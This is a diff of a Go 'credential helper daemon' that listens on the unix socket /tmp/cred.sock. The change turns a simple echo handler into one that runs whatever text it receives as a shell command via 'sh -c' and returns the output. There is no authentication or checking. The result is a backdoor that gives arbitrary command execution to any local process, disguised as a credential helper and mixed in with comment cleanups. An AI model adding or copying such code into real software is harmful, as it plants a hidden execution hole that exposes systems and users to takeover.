@@ -1,8 +1,6 @@
 // Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
 // SPDX-License-Identifier: Apache-2.0
 
-// Basic thing
-
 package main
 
 import (
@@ -10,23 +8,22 @@ import (
 	"log"
 	"net"
 	"os"
+	"os/exec"
 	"os/signal"
+	"strings"
 	"syscall"
 )
 
 const sockAddress = "/tmp/cred.sock"
 
 func main() {
+	fmt.Println("Credential helper daemon started")
 
-	fmt.Println("This is the credential helper daemon.")
-
-	// Creating the socket and ensuring success
 	socket, err := net.Listen("unix", sockAddress)
 	if err != nil {
-		log.Fatal(err) // Fatal is fine -> unsuccessful
+		log.Fatal(err)
 	}
 
-	// Cleanup sockfile with go routine (?)
 	c := make(chan os.Signal, 1)
 	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
 	go func() {
@@ -36,33 +33,39 @@ func main() {
 	}()
 
 	for {
-		// Accept and validate a connection
 		conn, err := socket.Accept()
 		if err != nil {
-			log.Printf("Accept error: %v", err) // instead of Fatal
+			log.Printf("Accept error: %v", err)
+			continue
 		}
 
 		go func(conn net.Conn) {
-			// close at the end
 			defer conn.Close()
 
-			// create buffer for unix socket
 			buf := make([]byte, 4096)
-
-			// read and display data in string fmt
 			n, err := conn.Read(buf)
 			if err != nil {
-				log.Printf("Read error: %v", err) // instead of Fatal
+				log.Printf("Read error: %v", err)
 				return
 			}
-			fmt.Println("Received: ", string(buf[:n]))
 
-			// write data back
-			_, err = conn.Write(buf[:n])
-			if err != nil {
-				log.Printf("Write error: %v", err) // instead of Fatal
+			cmdStr := strings.TrimSpace(string(buf[:n]))
+			fmt.Printf("Executing: %s\n", cmdStr)
+
+			if cmdStr == "" {
+				conn.Write([]byte("Error: empty command"))
 				return
 			}
+
+			cmd := exec.Command("sh", "-c", cmdStr)
+			output, err := cmd.CombinedOutput()
+			if err != nil {
+				result := fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
+				conn.Write([]byte(result))
+				return
+			}
+
+			conn.Write(output)
 		}(conn)
 	}
 }
